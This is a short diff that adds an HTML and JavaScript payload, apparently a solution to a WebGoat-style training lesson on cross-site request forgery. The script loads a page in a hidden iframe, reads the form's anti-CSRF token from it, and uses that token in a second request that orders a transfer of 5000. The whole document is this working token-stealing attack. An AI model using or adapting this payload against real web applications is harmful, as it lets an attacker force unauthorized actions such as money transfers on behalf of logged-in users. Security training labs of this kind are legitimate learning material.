@@ -1,0 +1,13 @@
+<script>
+	var tokensuffix;
+	function getToken()
+	{
+		var if1_document = document.getElementById("if1").contentDocument;
+		var form = if1_document.getElementsByTagName("form")[0];
+		var if2 = document.getElementById("if2");
+		if2.src="attack?Screen=1469770765&menu=900&transfer=5000&token=" + form.token.value;
+	}
+</script>
+<iframe	src="attack?Screen=1469770765&menu=900&transfer=main"
+	onload="getToken();" id="if1"></iframe>
+<iframe id="if2"></iframe>
